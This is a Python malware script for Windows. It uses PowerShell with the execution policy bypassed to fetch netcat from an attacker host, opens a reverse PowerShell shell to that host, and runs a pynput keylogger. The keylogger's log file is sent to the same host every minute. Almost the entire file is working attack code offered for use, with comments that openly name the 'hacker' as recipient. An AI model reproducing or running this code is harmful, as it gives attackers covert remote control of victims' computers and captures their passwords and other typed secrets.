import subprocess
import os
import pynput
import socket
import time
import threading

hacker_ip = '192.168.58.238'
current_working_directory = os.getcwd()


#Downloading Netcat Tool From Hacker Server
def download_file_with_powershell(file_url, save_path):
    powershell_command = f"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; wget -Uri '{file_url}' -OutFile '{save_path}\\test.exe'"
    subprocess.run(["powershell", "-Command", powershell_command], check=True)

#Starting Netcat and open reverse Shell
def run_netcat():
    powershell_command = f"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; ./test.exe {hacker_ip} 4444 -e powershell.exe"
    subprocess.run(["powershell", "-Command", powershell_command], check=True)

#Starting Record Keyboard Clicks
def keylogger():
    # Dictionary to map special keys to their representations
    SPECIAL_KEY_REPLACEMENTS = {
        pynput.keyboard.Key.space: " ",
        pynput.keyboard.Key.enter: "[Enter]",
        pynput.keyboard.Key.tab: "[Tab]",
        pynput.keyboard.Key.backspace: "[Backspace]",
        pynput.keyboard.Key.ctrl: "[Ctrl]",
        pynput.keyboard.Key.alt: "[Alt]",
        pynput.keyboard.Key.shift: "[Shift]",
        pynput.keyboard.Key.esc: "[Esc]",
        pynput.keyboard.Key.left: "[Left]",
        pynput.keyboard.Key.right: "[Right]",
        pynput.keyboard.Key.up: "[Up]",
        pynput.keyboard.Key.down: "[Down]",
        # Add more special keys and their replacements as needed
    }

    def listen_for_keys(on_press):
        keyboard = pynput.keyboard.Listener(on_press=on_press)
        keyboard.start()
        keyboard.join()

    def on_press(key):
        with open("keylog.txt", "a") as f:
            if key in SPECIAL_KEY_REPLACEMENTS:
                f.write(SPECIAL_KEY_REPLACEMENTS[key])
            else:
                try:
                    f.write(key.char)
                except AttributeError:
                    f.write(str(key))

    if __name__ == "__main__":
        listen_for_keys(on_press)

#Sending Data To Hacker
def sending_keylogger_file():
    def send_file(file_path, remote_server_ip, remote_server_port):
        with open(file_path, "rb") as file:
            file_data = file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((remote_server_ip, remote_server_port))
            client_socket.sendall(file_data)

        print("File sent successfully.")
    while True:
        if __name__ == "__main__":
            try:
                file_path = "keylog.txt"  # Update with the actual file path
                remote_server_ip = hacker_ip
                remote_server_port = 9999  # Update with the port your server is listening on
                send_file(file_path, remote_server_ip, remote_server_port)
                time.sleep(60)
            except:
                pass


#Calling All Functions
if __name__ == "__main__":
    file_url = f"http://{hacker_ip}:8000/nc.exe"
    save_directory = current_working_directory
if os.path.exists('test.exe'):
    pass
else:
    download_file_with_powershell(file_url, save_directory)

if __name__ == "__main__":
    netcat_thread = threading.Thread(target=run_netcat)
    keylogger_thread = threading.Thread(target=keylogger)
    sending_thread = threading.Thread(target=sending_keylogger_file)

    netcat_thread.start()
    keylogger_thread.start()
    sending_thread.start()

    netcat_thread.join()
    keylogger_thread.join()
    sending_thread.join()